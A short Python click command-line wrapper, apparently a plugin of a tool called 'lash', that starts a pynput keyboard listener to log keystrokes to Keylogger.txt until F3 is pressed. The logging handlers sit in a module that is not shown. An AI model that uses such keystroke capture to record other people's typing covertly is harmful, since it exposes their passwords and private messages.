import click
from lash.plugins.keylogger.core import key_down, key_up


@click.command(help="Keylogger — logs keystrokes to Keylogger.txt, F3 to stop")
@click.option(
    "-p", type=click.Path(exists=True), default=".", help="Path to write output file"
)
def keylogger(p):
    from pynput.keyboard import Listener

    click.echo("<running> f3 to stop")
    import os

    os.chdir(p)
    listener = Listener(on_press=key_down, on_release=key_up)
    listener.start()
    listener.join()
    click.echo("> Process Finished <")
